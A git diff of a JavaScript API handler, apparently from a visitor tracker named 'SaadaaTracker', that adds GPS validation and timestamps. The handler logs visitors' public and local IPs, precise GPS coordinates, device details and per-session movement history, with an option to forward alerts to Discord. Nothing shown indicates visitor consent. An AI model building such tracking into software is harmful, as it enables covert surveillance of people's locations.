@@ -50,10 +50,13 @@ export default async function handler(req, res) {
 
   const { sessionId, isUpdate, forceDiscord, localIp, preciseLocation, deviceStats, userAgent, language, screenResolution, referrer, page } = req.body;
 
+  // Validation stricte de la localisation précise
+  const hasGps = preciseLocation && typeof preciseLocation.lat === 'number' && typeof preciseLocation.lon === 'number';
+
   let displayLocation = `${geo.city || 'Inconnue'} (${geo.regionName || ''}), ${geo.country || 'Inconnu'} [ZIP: ${geo.zip || '?'}]`;
   
   // Si on a le GPS, on essaie de trouver le nom de la ville réelle (Reverse Geocoding)
-  if (preciseLocation) {
+  if (hasGps) {
     try {
       const revRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${preciseLocation.lat}&lon=${preciseLocation.lon}`, {
         headers: { 'User-Agent': 'SaadaaTracker/1.0' }
@@ -75,14 +78,15 @@ export default async function handler(req, res) {
     isUpdate: !!isUpdate,
     forceDiscord: !!forceDiscord,
     timestamp: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
+    unixTime: Date.now(),
     publicIp,
     localIp,
     location: displayLocation,
     isp: geo.isp || 'ISP inconnu',
-    coords: preciseLocation ? `${preciseLocation.lat}, ${preciseLocation.lon}` : `${geo.lat || '?'}, ${geo.lon || '?'}`,
-    accuracy: preciseLocation ? preciseLocation.accuracy : null,
+    coords: hasGps ? `${preciseLocation.lat}, ${preciseLocation.lon}` : `${geo.lat || '?'}, ${geo.lon || '?'}`,
+    accuracy: hasGps ? preciseLocation.accuracy : null,
     deviceStats: deviceStats || {},
-    isPrecise: !!preciseLocation,
+    isPrecise: hasGps,
     userAgent,
     language,
     screenResolution,
@@ -153,11 +157,12 @@ export default async function handler(req, res) {
 
       // 2. Historique de mouvement pour cette session
       const movementData = JSON.stringify({
-        lat: preciseLocation ? preciseLocation.lat : geo.lat,
-        lon: preciseLocation ? preciseLocation.lon : geo.lon,
+        lat: hasGps ? preciseLocation.lat : geo.lat,
+        lon: hasGps ? preciseLocation.lon : geo.lon,
         accuracy: logEntry.accuracy,
         deviceStats: logEntry.deviceStats,
         time: logEntry.timestamp,
+        unixTime: logEntry.unixTime,
         isPrecise: logEntry.isPrecise,
         localIp: localIp,
         page: logEntry.page
